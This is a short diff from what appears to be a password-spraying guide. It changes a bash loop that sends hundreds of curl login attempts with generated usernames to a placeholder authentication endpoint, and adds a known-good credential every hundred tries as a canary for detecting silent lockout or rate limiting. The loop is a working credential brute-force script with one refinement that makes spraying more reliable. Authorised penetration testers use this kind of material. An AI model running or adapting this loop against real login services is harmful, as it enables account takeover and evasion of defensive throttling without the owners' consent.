@@ -101,7 +101,9 @@ Before spraying, classify the target endpoint into one of four states:
 # Your "no rate limit" conclusion was false
 KNOWN_GOOD="user@target.com:CorrectP@ss"
 for n in $(seq 0 600); do
-  code=$(curl --max-time 30 --connect-timeout 10 -sk -u "user${n}@target.com:WrongP@ss" -o /dev/null -w "%{http_code}" \
+  creds="user${n}@target.com:WrongP@ss"
+  [ $((n % 100)) -eq 0 ] && creds="$KNOWN_GOOD"   # canary: known-good must keep working
+  code=$(curl --max-time 30 --connect-timeout 10 -sk -u "$creds" -o /tmp/bf_body -w "%{http_code}" \
     "https://TARGET/auth-endpoint")
   echo "$n $code $(wc -c </tmp/bf_body)"
 done
